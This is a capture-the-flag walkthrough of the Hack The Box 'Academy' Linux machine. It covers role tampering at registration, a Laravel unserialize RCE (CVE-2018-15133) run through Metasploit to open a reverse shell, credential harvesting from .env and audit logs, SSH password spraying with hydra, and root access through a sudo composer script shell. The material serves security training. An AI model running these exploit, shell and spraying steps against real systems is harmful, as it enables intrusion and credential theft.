# Target
| Category          | Details                                                |
|-------------------|--------------------------------------------------------|
| 📝 **Name**       | [Academy](https://app.hackthebox.com/machines/Academy) |  
| 🏷 **Type**       | HTB Machine                                            |
| 🖥 **OS**         | Linux                                                  |
| 🎯 **Difficulty** | Easy                                                   |
| 📁 **Tags**       | Laravel, CVE-2018-15133, Metasploit, composer          |

# Scan
```
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://academy.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx  MySQL X protocol listener
```

# Attack path
1. [Discover staging virtual host in admin panel](#discover-staging-virtual-host-in-admin-panel)
2. [Gain initial foothold using RCE in Laravel due to unserialize call on `X-XSRF-TOKEN` HTTP header (CVE-2018-15133)](#gain-initial-foothold-using-rce-in-laravel-due-to-unserialize-call-on-x-xsrf-token-http-header-cve-2018-15133)
3. [Escalate to `cry0l1t3` user using discovered credentials](#escalate-to-cry0l1t3-user-using-discovered-credentials)
4. [Escalate to `mrb3n` user using discovered credentials](#escalate-to-mrb3n-user-using-discovered-credentials)

### Discover staging virtual host in admin panel

#### Add `academy.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Academy]
└─$ echo "$TARGET academy.htb" | sudo tee -a /etc/hosts
10.129.136.194 academy.htb
```

#### Create `admin` account by tampering `roleid` HTTP parameter
`roleid` parameter changed from `0` to `1`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Academy]
└─$ curl http://academy.htb/register.php -d 'uid=hacker&password=pass&confirm=pass&roleid=1'
```

#### Discover `dev-staging-01.academy.htb` virtual host after accessing admin panel
Admin panel discovered with `feroxbuster`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Academy]
└─$ curl -s -L -c cookies.txt http://academy.htb/admin.php -d 'uid=hacker&password=pass' | grep "Fix issue with"
    <td>Fix issue with dev-staging-01.academy.htb</td>
```

#### Add `dev-staging-01.academy.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Academy]
└─$ echo "$TARGET dev-staging-01.academy.htb" | sudo tee -a /etc/hosts
10.129.136.194 dev-staging-01.academy.htb
```

### Gain initial foothold using RCE in Laravel due to unserialize call on `X-XSRF-TOKEN` HTTP header ([CVE-2018-15133](https://nvd.nist.gov/vuln/detail/cve-2018-15133))

#### Discover Laravel application key dumped in error log on `dev-staging-01.academy.htb`
```
┌──(magicrc㉿perun)-[~/attack/HTB Academy]
└─$ APP_KEY=$(curl -s dev-staging-01.academy.htb | grep -m 1 -A1 APP_KEY | grep -oP 'base64:\K[^"<]*')      
```

#### Use discovered application key on `exploit/unix/http/laravel_token_unserialize_exec` Metasploit module to spawn reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Academy]
└─$ msfconsole -q -x "\
    use exploit/unix/http/laravel_token_unserialize_exec; \
    set LHOST tun0; \
    set LPORT 4444; \
    set RHOST dev-staging-01.academy.htb; \
    set APP_KEY $APP_KEY; \
    run
"
[*] Starting persistent handler(s)...
[*] Using configured payload cmd/unix/reverse_perl
LHOST => tun0
LPORT => 4444
RHOST => dev-staging-01.academy.htb
APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
[*] Started reverse TCP handler on 10.10.16.40:4444 
[*] Command shell session 1 opened (10.10.16.40:4444 -> 10.129.136.194:37976) at 2025-09-03 21:16:38 +0200
[*] Command shell session 2 opened (10.10.16.40:4444 -> 10.129.136.194:37978) at 2025-09-03 21:16:38 +0200
[*] Command shell session 3 opened (10.10.16.40:4444 -> 10.129.136.194:37980) at 2025-09-03 21:16:39 +0200
[*] Command shell session 4 opened (10.10.16.40:4444 -> 10.129.136.194:37982) at 2025-09-03 21:16:40 +0200
/usr/bin/script -qc /bin/bash /dev/null
www-data@academy:/var/www/html/htb-academy-dev-01/public$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Escalate to `cry0l1t3` user using discovered credentials

#### Discover password in `/var/www/html/academy/.env` file
Password has been discovered with `linpeas`.
```
www-data@academy:/var/www/html/htb-academy-dev-01/public$ grep PASS /var/www/html/academy/.env
<dev-01/public$ grep PASS /var/www/html/academy/.env      
DB_PASSWORD=mySup3rP4s5w0rd!!
REDIS_PASSWORD=null
MAIL_PASSWORD=null
```

#### Obtain users list for password spraying
```
www-data@academy:/var/www/html/htb-academy-dev-01/public$ grep -E "/bin/(sh|bash)" /etc/passwd | cut -d: -f1
< grep -E "/bin/(sh|bash)" /etc/passwd | cut -d: -f1      
root
egre55
mrb3n
cry0l1t3
21y4d
ch4p
g0blin
```

#### Spray password over SSH server
```
┌──(magicrc㉿perun)-[~/attack/HTB Academy]
└─$ hydra -L users.txt -p 'mySup3rP4s5w0rd!!' ssh://academy.htb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-03 21:55:04
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:7/p:1), ~1 try per task
[DATA] attacking ssh://academy.htb:22/
[22][ssh] host: academy.htb   login: cry0l1t3   password: mySup3rP4s5w0rd!!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-03 21:55:10
```

#### Gain access over SSH as `cry0l1t3` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Academy]
└─$ ssh cry0l1t3@academy.htb
cry0l1t3@academy.htb's password: 
<SNIP>
$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

### Escalate to `mrb3n` user using discovered credentials

#### Discover `mrb3n` user password in audit logs
Password has been discovered with `linpeas`.
```
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

#### Run shell as `mrb3n` user
```
$ su mrb3n
Password: 
$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
```

### Escalate to `root` user using `composer` PHP dependency manager

#### List allowed sudo commands
```
$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

#### Spawn root shell using script in `composer.json`
```
$ TF=$(mktemp -d) && \
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json && \
sudo composer --working-dir=$TF run-script x> > 
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
uid=0(root) gid=0(root) groups=0(root)
```


